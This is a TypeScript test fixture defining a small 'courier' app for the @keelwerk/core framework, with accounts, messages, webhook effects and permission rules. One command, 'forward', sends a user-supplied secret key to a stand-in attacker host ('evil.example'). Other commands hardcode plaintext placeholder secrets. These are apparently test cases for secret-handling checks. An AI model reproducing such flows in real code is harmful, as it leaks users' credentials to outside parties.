import type { AppType } from '@keelwerk/core';
import {
  defineApp,
  defineCommand,
  defineEffect,
  defineEffectExecutor,
  defineEntity,
  defineModule,
  defineModuleBase,
  defineRule,
  field,
  outcomeOf,
  shape,
} from '@keelwerk/core';

const account = defineEntity({
  prefix: 'cra',
  dataSubject: 'owner',
  fields: { owner: field.subject() },
});

const message = defineEntity({
  prefix: 'crm',
  dataSubject: 'accountId.owner',
  fields: { accountId: field.ref.own('account'), subject: field.string().personal() },
});

const courierBase = defineModuleBase({
  id: 'courier',
  version: '0.1.0',
  entities: { account, message },
});

const post = defineEffect(courierBase, {
  input: shape({ url: field.string(), signingKey: field.secret(), body: field.text() }),
  output: shape({ status: field.integer() }),
});

const deliver = defineEffect(courierBase, {
  performer: 'external',
  input: shape({
    messageId: field.ref.own('message'),
    to: field.string().personal(),
  }),
  dataSubject: 'messageId.accountId.owner',
});

const postExecutor = defineEffectExecutor(courierBase, post, {
  queue: 'hooks',
  run: () => Promise.resolve({ status: 200 }),
});

const sendInput = shape({
  owner: field.subject(),
  subject: field.string(),
  to: field.string(),
});

const send = defineCommand(courierBase, {
  input: sendInput,
  output: shape({ messageId: field.ref.own('message') }),
  principal: 'user',
  *decide(input, ctx) {
    const accountId = yield* ctx.newId(account);
    const messageId = yield* ctx.newId(message);
    return {
      events: [
        ctx.write.courier.account.create({ id: accountId, owner: input.owner }),
        ctx.write.courier.message.create({ id: messageId, accountId, subject: input.subject }),
      ],
      effects: [
        post({
          url: 'https://hooks.example/in',
          signingKey: 'plain-signing-key-1' as never,
          body: 'hello',
        }),
        deliver({ messageId, to: input.to }),
      ],
      result: { messageId },
    };
  },
});

const open = defineCommand(courierBase, {
  input: shape({ owner: field.subject(), subject: field.string() }),
  output: shape({ messageId: field.ref.own('message') }),
  principal: 'user',
  *decide(input, ctx) {
    const accountId = yield* ctx.newId(account);
    const messageId = yield* ctx.newId(message);
    return {
      events: [
        ctx.write.courier.account.create({ id: accountId, owner: input.owner }),
        ctx.write.courier.message.create({ id: messageId, accountId, subject: input.subject }),
      ],
      result: { messageId },
    };
  },
});

const sendReversed = defineCommand(courierBase, {
  input: sendInput,
  output: shape({ messageId: field.ref.own('message') }),
  principal: 'user',
  *decide(input, ctx) {
    const accountId = yield* ctx.newId(account);
    const messageId = yield* ctx.newId(message);
    return {
      events: [
        ctx.write.courier.message.create({ id: messageId, accountId, subject: input.subject }),
        ctx.write.courier.account.create({ id: accountId, owner: input.owner }),
      ],
      result: { messageId },
    };
  },
});

const issue = defineCommand(courierBase, {
  output: shape({ apiKey: field.secret() }),
  principal: 'user',
  decide: () => ({ result: { apiKey: 'plain-api-key-1' as never } }),
});

const forward = defineCommand(courierBase, {
  input: shape({ key: field.secret() }),
  principal: 'user',
  decide: (input) => ({
    effects: [post({ url: 'https://evil.example/in', signingKey: input.key, body: 'hello' })],
  }),
});

const afterPost = defineCommand(courierBase, {
  input: outcomeOf(
    post,
    shape({ token: field.secret().optional(), note: field.string().optional() }),
  ),
  principal: 'user',
  decide: () => ({}),
});

const chain = defineCommand(courierBase, {
  input: shape({ token: field.secret().optional(), note: field.string() }),
  principal: 'user',
  decide: (input) => ({
    effects: [
      post(
        { url: 'https://hooks.example/in', signingKey: 'plain-signing-key-2' as never, body: 'x' },
        {
          continueWith: afterPost,
          with: input.token === undefined ? { note: input.note } : { token: input.token },
        },
      ),
    ],
  }),
});

const courierDef = defineModule(courierBase, {
  actions: { send, open, sendReversed, issue, forward, chain, afterPost },
  effects: { post, deliver },
  executors: { post: postExecutor },
  policies: {
    send: { signedIn: defineRule(courierBase, send, { effect: 'allow', principal: 'user' }) },
    open: { signedIn: defineRule(courierBase, open, { effect: 'allow', principal: 'user' }) },
    sendReversed: {
      signedIn: defineRule(courierBase, sendReversed, { effect: 'allow', principal: 'user' }),
    },
    issue: { signedIn: defineRule(courierBase, issue, { effect: 'allow', principal: 'user' }) },
    forward: { signedIn: defineRule(courierBase, forward, { effect: 'allow', principal: 'user' }) },
    chain: { signedIn: defineRule(courierBase, chain, { effect: 'allow', principal: 'user' }) },
    afterPost: {
      signedIn: defineRule(courierBase, afterPost, { effect: 'allow', principal: 'user' }),
    },
    account: {
      writers: defineRule(courierBase, account, {
        effect: 'allow',
        actions: ['write'],
        principal: 'user',
        reason: 'A signed-in user writes accounts.',
      }),
    },
    message: {
      writers: defineRule(courierBase, message, {
        effect: 'allow',
        actions: ['write'],
        principal: 'user',
        reason: 'A signed-in user writes messages.',
      }),
    },
  },
});
const courierAppDef = defineApp({ id: 'courier', modules: [courierDef] });

/** The test-local `courier` app: accounts, messages, the hooks sketch effect and a personal effect. */
export interface CourierApp extends AppType<typeof courierAppDef> {}
export const courierApp: CourierApp = courierAppDef;
